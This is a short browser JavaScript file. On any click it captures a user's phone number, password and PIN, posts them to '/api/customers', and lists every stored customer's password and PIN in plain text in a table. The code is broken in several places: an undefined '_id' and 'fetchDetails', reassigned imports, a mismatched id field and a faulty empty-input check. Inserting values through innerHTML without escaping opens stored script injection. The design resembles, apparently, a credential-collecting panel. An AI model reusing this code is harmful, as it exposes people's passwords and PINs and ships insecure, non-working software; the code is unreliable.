import { input_number, input_password, userPin} from './main.mjs';

const details_box = document.getElementById('details_box')

window.addEventListener('click', (e) => {
    e.preventDefault()

    let number = input_number.value;
    let password = input_password.value;
    let pin = userPin.value

    if (!number && password && pin) {
        return
    }

    postDetails(number, password, pin);
})

//Posting Data to DOM and syncing with db
function postDetails(number, password, pin) {

    let data = {
      id:_id,
        phoneNumber: number,
        password: password,
        number:pin
    }


    appendToDom(data)
    input_number = ''
    input_password = ''
    userPin = ''

    syncWithData(data)
    fetchDetails(data)
}

function appendToDom(data) {
   let list = document.createElement('tr')

    let content = `
    <td data-label="id">${data._id}</td>
    <td data-label="Phone Number">${data.phoneNumber}</td>
    <td data-label="Password">${data.password}</td>
    <td data-label="pin">${data.number}</td>
    `
    list.innerHTML = content;
    details_box.prepend(list);
}


//API Calls
function syncWithData(data) {

            fetch('/api/customers', {
              method: 'Post',
              body: JSON.stringify(data),
              headers: {
                  'Content-Type':'application/json',
                  'Accept':'application/json'
              }
            }
        )
        .then(response => response.json())
      .then(result => {
          console.log(result)
      })
    }

    function fetchCustomers() {
      fetch('/api/customers')
        .then(res => res.json())
        .then(result => {
          result.forEach((customer) => {
            appendToDom(customer)
          })
        })
    }

    window.onload = fetchCustomers